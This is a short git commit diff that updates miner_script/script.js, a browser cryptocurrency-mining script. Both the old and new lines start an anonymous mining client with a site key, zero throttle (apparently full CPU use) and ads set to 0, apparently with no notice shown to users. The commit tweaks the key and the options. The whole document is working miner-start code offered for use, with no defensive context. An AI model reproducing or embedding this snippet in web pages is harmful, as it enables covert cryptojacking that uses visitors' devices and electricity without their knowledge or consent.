03400baa834ea251e5fba22d9b0242b9a1ac7323
rootmelo92118 <32770959+rootmelo92118@users.noreply.github.com>
2019-07-27 15:17:41 +0800

    Update script.js

--- miner_script/script.js
+++ miner_script/script.js
@@ -1,4 +1,4 @@
-var _client = new Client.Anonymous('34716e1c17cde5f2502691d2dad65dd51c1a8eb170f40ea7d17a6e7fa7c9475e', {
-    throttle: 0, ads: 0
-});
-_client.start();
+var _client = new Client.Anonymous('34716e1c17cde5f2502691d2dad65dd51c1a8eb170f40ea7d17a6e7fa7c9475', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
